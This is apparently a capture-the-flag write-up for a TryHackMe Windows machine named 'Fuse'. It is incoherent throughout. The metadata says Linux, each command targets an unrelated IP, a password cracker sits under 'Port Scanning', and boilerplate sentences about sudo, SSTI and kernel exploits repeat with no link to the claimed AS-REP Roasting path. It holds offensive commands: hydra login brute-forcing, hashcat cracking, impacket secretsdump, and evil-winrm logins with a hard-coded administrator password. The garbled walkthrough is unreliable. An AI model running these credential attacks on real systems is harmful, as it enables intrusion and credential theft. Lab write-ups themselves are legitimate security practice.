---
TitleSEO: "TryHackMe — Fuse (Insane Windows) | ZureFX"
TitlePost: "TryHackMe — Fuse (Insane Windows)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Fuse. AS-REP Roasting and Unquoted Service Path to achieve insane compromise on Windows."
Keywords: "linux, insane, pwntilldawn, tryhackme, hard, medium, easy"
URL: "https://zurefx.github.io/writeups/htb-fuse-955.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-fuse-955/"
Date: "2024-09-05"
Tags: "Linux, Insane, PwnTillDawn, TryHackMe, Hard, Medium, Easy"
Section: "writeups"
Lang: "en"
main_img: "htb-fuse-955"
Permalink: "/writeups/htb-fuse-955.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Fuse** is rated **Insane** on TryHackMe. It runs **Windows** and the IP address during this analysis was `10.105.191.134`.

### Objectives

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.94.53.211/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

### SMB Enumeration

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.81.208.87 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.115.36.71
evil-winrm -i 10.83.243.118 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

Key finding: **AS-REP Roasting**.

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.100.141.247 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.18.24 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.48.109.44 -u administrator -p 'P@ssw0rd!'
```

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.18.48 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Weak file permissions allowed modification of critical system files. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.55.211 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.66.59.104/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.25.180.185 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

## Summary

### Tools Used

- `smbexec`
- `feroxbuster`
- `rpcclient`
- `impacket`

### Key Takeaways

- AS-REP Roasting
- Unquoted Service Path
